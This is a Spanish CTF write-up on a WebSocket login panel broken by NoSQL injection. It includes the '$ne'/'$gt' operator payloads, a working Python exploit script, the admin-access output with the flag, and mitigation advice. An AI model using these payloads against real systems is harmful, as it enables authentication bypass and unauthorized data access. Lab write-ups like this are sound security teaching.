---
tipo: laboratorio
tags: [ctf, pentraze, web, easy]
Plataforma: "Pentraze CTF"
Categoría: "Web"
Dificultad: "Easy"
Estado: "Completado"
Puntos: "25"
Flag: "PENTRAZE{ab003dc4f68f5e727d29e2d037838f6f713c3001dd7be56e208956727de33c0c}"
actualizado: 2026-09-24
---
- **Categoría Principal:** [[CTF - Web|Web]]
- **Dificultad:** [[CTF - Easy|Easy]]
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Estado:** Completado
- **Puntos:** 25

# Writeup - Eco Persistente

> [!info] Objetivo
> Obtener la flag del panel RootKitty Signal mediante WebSocket y NoSQL Injection.

- **Target:** `http://34.135.253.132:34821`
- **Categoría:** Web
- **Dificultad de la clasificación final:** Easy
- **Vector principal:** WebSocket + [[NoSQL Injection]]

## Resumen rápido de la cadena de ataque

1. `app.js` reveló el protocolo JSON del WebSocket `/stream`.
2. El mensaje `session.hello` exponía una cuenta demo y el operador reservado `rootkitty-core`.
3. Se probó un objeto JSON como `accessKey` en lugar de una cadena.
4. `$ne: null` permite saltarse la comprobación de credenciales y concede el rol admin.
5. `vault.read` devuelve la flag en un frame `vault.result`.

## Vulnerabilidades explotadas

- **[[NoSQL Injection]]:** un objeto JSON con operador `$ne` se interpretaba como predicado de consulta.
- **Ausencia de validación estricta de tipos** en `accessKey`; el backend aceptaba objetos donde esperaba un string.
- **Bypass de autenticación** sin conocer la contraseña real.
- **[[WebSocket]] como superficie de negocio:** la lógica de autorización se aplicaba a frames no revisados por una prueba HTTP convencional.
- **Divulgación de información** en el mensaje inicial de sesión.

## Paso a paso técnico

### 1. Reconocimiento del frontend

```bash
BASE="http://34.135.253.132:34821"
curl -s "$BASE/assets/app.js" -o app.js
```

El JavaScript indicaba:

```text
ws://<host>/stream
```

Tipos relevantes:

```text
auth.login    → {handle, accessKey}
auth.logout
vault.read    → devuelve {flag}
feed.refresh  → devuelve snapshot
```

La flag solo se mostraba para un frame con `type == "vault.result"`. El `hello` del servidor incluía:

```json
{
  "type": "session.hello",
  "protocol": "RK/1",
  "demo": {"handle": "observer", "accessKey": "observer-demo"},
  "operator": {"handle": "rootkitty-core", "status": "reservado"}
}
```

### 2. Enumeración del protocolo

La cuenta demo podía iniciar sesión, pero `vault.read` devolvía `FORBIDDEN`. La pista útil era el operador reservado: el objetivo era obtener su rol admin.

La hipótesis de backend era una consulta equivalente a:

```javascript
findUser({ handle, accessKey })
```

Si `accessKey` se interpeta como operador de MongoDB, este objeto:

```json
{"$ne": null}
```

se convierte lógicamente en “accessKey distinto de null”. El login vulnerable fue:

```json
{
  "type": "auth.login",
  "handle": "rootkitty-core",
  "accessKey": {"$ne": null}
}
```

### 3. Explotación con Python

Dependencia: `pip install websockets`.

```python
import asyncio
import json

import websockets

URL = "ws://34.135.253.132:34821/stream"


async def main():
    async with websockets.connect(URL, ping_interval=None) as ws:
        await ws.recv()  # session.hello
        await ws.recv()  # snapshot inicial

        await ws.send(json.dumps({
            "type": "auth.login",
            "handle": "rootkitty-core",
            "accessKey": {"$ne": None},
        }))
        print(await ws.recv())

        await ws.send(json.dumps({"type": "vault.read"}))
        print(await ws.recv())


asyncio.run(main())
```

Salida relevante:

```json
{"type":"auth.result","ok":true,"account":{"handle":"rootkitty-core","displayName":"RootKitty Core","role":"admin"}}
{"type":"vault.result","record":"rootkitty/core/rotation","flag":"PENTRAZE{ab003dc4f68f5e727d29e2d037838f6f713c3001dd7be56e208956727de33c0c}"}
```

`{"$gt": ""}` también funcionó porque aplica la misma idea. `$regex` no fue aceptado por la implementación del lookup.

## Flag

```text
PENTRAZE{ab003dc4f68f5e727d29e2d037838f6f713c3001dd7be56e208956727de33c0c}
```

## Lecciones aprendidas y mitigar

- Validar el esquema en el servidor y rechazar objetos cuando el campo debe ser un string.
- Usar consultas con esquemas estrictos, por ejemplo Mongoose `strict: true`, y evitar pasar estructuras JSON controladas por el usuario directamente a un ODM.
- Hacer coerción explícita antes de comparar o generar la consulta; no confiar en `typeof` del cliente.
- Aplicar rate limiting, bloqueo temporal y alertas ante campos anidados u operadores `$` en login.
- Autorizar cada mensaje WebSocket en el backend usando el estado de sesión del servidor, sin confiar en un `handle` enviado por el cliente.
- Registrar payloads anómalos y separar la lógica de lectura del vault de la autenticación demo.
- Añadir pruebas de seguridad para WebSocket, no solo para endpoints HTTP.

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🗂️ Categoría: [[CTF - Web]]
- ⬅️ Anterior: [[Writeup - Escaperoom|Escaperoom]]
- ➡️ Siguiente: [[Writeup - Xouroboros|Xouroboros]]

## Relacionadas

- [[WebSocket]] — protocolo de mensajes usado en el panel.
- [[NoSQL Injection]] — operadores JSON en consultas de bases de datos no relacionales.
- [[Authentication]] — separación entre prueba de login y autorización de cada acción.
